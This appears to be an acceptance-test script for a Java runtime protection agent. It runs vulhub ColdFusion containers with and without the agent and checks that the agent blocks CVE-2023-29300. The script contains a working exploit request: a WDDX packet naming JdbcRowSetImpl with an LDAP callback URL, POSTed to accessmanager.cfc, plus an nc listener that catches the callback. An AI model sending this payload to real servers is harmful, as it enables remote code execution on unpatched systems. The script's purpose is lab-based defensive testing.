#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_COLDFUSION_29300_IMAGE:-vulhub/coldfusion:2018.0.15}"
baseline_name="${OHMYRASP_VULHUB_COLDFUSION_29300_BASELINE_NAME:-ohmyrasp-coldfusion29300-baseline}"
protected_name="${OHMYRASP_VULHUB_COLDFUSION_29300_PROTECTED_NAME:-ohmyrasp-coldfusion29300-protected}"
baseline_port="${OHMYRASP_VULHUB_COLDFUSION_29300_BASELINE_PORT:-19630}"
protected_port="${OHMYRASP_VULHUB_COLDFUSION_29300_PROTECTED_PORT:-19631}"
ldap_port="${OHMYRASP_VULHUB_COLDFUSION_29300_LDAP_PORT:-20393}"
host_agent_jar="$(pwd)/agent-java11/build/libs/ohmyrasp-agent-java11.jar"
baseline_dir="logs/vulhub-coldfusion-2018.0.15-29300-java11-baseline"
protected_dir="logs/vulhub-coldfusion-2018.0.15-29300-java11-protected"
payload_dir="logs/vulhub-coldfusion-2018.0.15-29300-java11-payload"
protected_log="${protected_dir}/events.jsonl"
listener_pid=""
gradle_cache_dir=""

copy_artifacts() {
  local name="$1"
  local dir="$2"
  mkdir -p "$dir"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
    docker exec "$name" sh -lc \
      'tail -n 160 /opt/coldfusion/cfusion/logs/coldfusion-out.log 2>/dev/null || true; echo "---"; tail -n 160 /opt/coldfusion/cfusion/logs/exception.log 2>/dev/null || true' \
      > "${dir}/coldfusion-logs.txt" 2>&1 || true
  fi
}

stop_listener() {
  if [[ -n "${listener_pid}" ]]; then
    kill "$listener_pid" >/dev/null 2>&1 || true
    wait "$listener_pid" >/dev/null 2>&1 || true
    listener_pid=""
  fi
}

cleanup() {
  stop_listener
  copy_artifacts "$baseline_name" "$baseline_dir"
  copy_artifacts "$protected_name" "$protected_dir"
  docker rm -f -v "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
  if [[ -n "${gradle_cache_dir:-}" ]]; then
    rm -rf "${gradle_cache_dir}" >/dev/null 2>&1 || true
  fi
}
trap cleanup EXIT

curl_status() {
  local output="$1"
  shift
  local status
  status="$(curl --max-time 60 -sS -o "$output" -w "%{http_code}" "$@" 2>"${output}.err" || true)"
  if [[ -z "$status" ]]; then
    status="000"
  fi
  printf "%s" "$status"
}

verify_image_java11() {
  docker run --rm --entrypoint sh "$image" -lc '/opt/coldfusion/jre/bin/java -version' \
    > "${payload_dir}/image-java-version.txt" 2>&1
  if ! grep -Fq 'version "11.' "${payload_dir}/image-java-version.txt"; then
    cat "${payload_dir}/image-java-version.txt" >&2 || true
    echo "ColdFusion CVE-2023-29300 image did not report a Java 11 runtime" >&2
    exit 1
  fi
}

start_baseline() {
  docker run -d --name "$baseline_name" \
    --add-host host.docker.internal:host-gateway \
    -p "${baseline_port}:8500" \
    -e password=vulhub \
    -e acceptEULA=YES \
    "$image" >/dev/null
}

start_protected() {
  docker run -d --name "$protected_name" \
    --add-host host.docker.internal:host-gateway \
    -p "${protected_port}:8500" \
    -e password=vulhub \
    -e acceptEULA=YES \
    -e OHMYRASP_LOG_SYNC=true \
    -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java11.jar:ro" \
    -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
    --entrypoint sh \
    "$image" \
    -lc 'sed -i "s#^java.args=#java.args=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java11.jar -Dohmyrasp.java11.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java11.block=true #" /opt/coldfusion/cfusion/bin/jvm.config && exec sh /opt/startup/start-coldfusion.sh start' \
    >/dev/null
}

wait_for_coldfusion() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local require_startup="${4:-false}"
  local status startup
  for attempt in $(seq 1 180); do
    status="$(curl_status "${dir}/ready-${attempt}.html" \
      "http://127.0.0.1:${port}/CFIDE/administrator/index.cfm")"
    startup="yes"
    if [[ "$require_startup" == "true" ]]; then
      startup="no"
      grep -Fq '"event":"ohmyrasp-java11-agent-start"' "$protected_log" && startup="yes"
    fi
    printf 'ready_attempt=%s status=%s startup=%s\n' "$attempt" "$status" "$startup" \
      >> "${dir}/attempts.log"
    if [[ "$status" == "200" || "$status" == "302" ]] && [[ "$startup" == "yes" ]]; then
      cp "${dir}/ready-${attempt}.html" "${dir}/administrator-index.html"
      return
    fi
    if ! docker ps --filter "name=${name}" --filter status=running --format '{{.Names}}' \
      | grep -Fq "$name"; then
      docker logs "$name" >&2 || true
      echo "ColdFusion container ${name} stopped before readiness" >&2
      exit 1
    fi
    sleep 2
  done
  docker logs "$name" >&2 || true
  echo "ColdFusion did not become ready on ${port}" >&2
  exit 1
}

start_ldap_listener() {
  local output="$1"
  stop_listener
  : > "$output"
  (timeout 45 nc -l "$ldap_port" > "$output" 2>&1 || true) &
  listener_pid="$!"
  sleep 1
}

send_wddx_payload() {
  local port="$1"
  local output="$2"
  local ldap_url="ldap://host.docker.internal:${ldap_port}/Exploit"
  local body
  body="argumentCollection=<wddxPacket version='1.0'><header/><data><struct type='xcom.sun.rowset.JdbcRowSetImplx'><var name='dataSourceName'><string>${ldap_url}</string></var><var name='autoCommit'><boolean value='true'/></var></struct></data></wddxPacket>"
  curl_status "$output" \
    -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-binary "$body" \
    "http://127.0.0.1:${port}/CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true"
}

assert_protected_startup_quiet() {
  if ! grep -Fq '"request_hook":"installed"' "$protected_log"; then
    cat "$protected_log" >&2 || true
    echo "missing Java 11 request hook startup marker in protected ColdFusion container" >&2
    exit 1
  fi
  if grep -Fq '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "protected ColdFusion produced a detection before WDDX exploit traffic" >&2
    exit 1
  fi
}

typed_payload_block_count() {
  grep -Ec '"hook":"HttpServlet.service".*"algorithm":"java11_request_typed_payload_deserialization".*"action":"block"' \
    "$protected_log" 2>/dev/null || true
}

wait_for_typed_payload_block() {
  local previous="$1"
  local count
  for attempt in $(seq 1 30); do
    count="$(typed_payload_block_count)"
    if (( count > previous )); then
      printf 'typed_payload_block_attempt=%s count=%s\n' "$attempt" "$count" \
        >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing java11_request_typed_payload_deserialization block event for ColdFusion CVE-2023-29300" >&2
  exit 1
}

run_baseline() {
  start_baseline
  wait_for_coldfusion "$baseline_name" "$baseline_port" "$baseline_dir"

  local status listener_output
  listener_output="${baseline_dir}/ldap-listener.txt"
  start_ldap_listener "$listener_output"
  status="$(send_wddx_payload "$baseline_port" "${baseline_dir}/wddx.response")"
  printf 'baseline_wddx_status=%s\n' "$status" >> "${baseline_dir}/attempts.log"
  sleep 2
  stop_listener
  if [[ ! -s "$listener_output" ]]; then
    cat "${baseline_dir}/wddx.response" >&2 || true
    echo "baseline ColdFusion CVE-2023-29300 did not connect to LDAP listener" >&2
    exit 1
  fi
  copy_artifacts "$baseline_name" "$baseline_dir"
  docker rm -f -v "$baseline_name" >/dev/null 2>&1 || true
  if [[ -n "${gradle_cache_dir:-}" ]]; then
    rm -rf "${gradle_cache_dir}" >/dev/null 2>&1 || true
  fi
}

run_protected() {
  start_protected
  wait_for_coldfusion "$protected_name" "$protected_port" "$protected_dir" true
  assert_protected_startup_quiet

  local previous_count status listener_output
  previous_count="$(typed_payload_block_count)"
  listener_output="${protected_dir}/ldap-listener.txt"
  start_ldap_listener "$listener_output"
  status="$(send_wddx_payload "$protected_port" "${protected_dir}/wddx.response")"
  printf 'protected_wddx_status=%s\n' "$status" >> "${protected_dir}/attempts.log"
  wait_for_typed_payload_block "$previous_count"
  sleep 2
  stop_listener
  if [[ -s "$listener_output" ]]; then
    wc -c "$listener_output" >&2 || true
    echo "protected ColdFusion CVE-2023-29300 still connected to LDAP listener" >&2
    exit 1
  fi
  if grep -Fq 'host.docker.internal' "$protected_log"; then
    cat "$protected_log" >&2 || true
    echo "ColdFusion CVE-2023-29300 block event leaked the LDAP endpoint" >&2
    exit 1
  fi
}

gradle_cache_dir="$(mktemp -d "${TMPDIR:-/tmp}/ohmyrasp-gradle-cache-coldfusion29300.XXXXXX")"
docker run --rm -u "$(id -u):$(id -g)"   -e HOME=/tmp/gradle-home \
  -e GRADLE_USER_HOME=/tmp/gradle-cache \
  -v "${gradle_cache_dir}:/tmp/gradle-cache" \
  -v "$(pwd):/workspace" \
  -w /workspace \
  gradle:jdk25 \
  gradle --no-daemon :agent-java11:agentJava11Jar >/dev/null

if ! command -v nc >/dev/null 2>&1; then
  echo "ColdFusion CVE-2023-29300 acceptance requires nc for the LDAP listener" >&2
  exit 1
fi

rm -rf "$baseline_dir" "$protected_dir" "$payload_dir"
mkdir -p "$baseline_dir" "$protected_dir" "$payload_dir"
: > "$protected_log"
chmod 777 "$protected_dir"
chmod 666 "$protected_log"
docker rm -f -v "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

verify_image_java11
run_baseline
run_protected

copy_artifacts "$protected_name" "$protected_dir"
docker rm -f -v "$protected_name" >/dev/null 2>&1 || true

echo "vulhub ColdFusion 2018.0.15 CVE-2023-29300 Java11 acceptance passed"
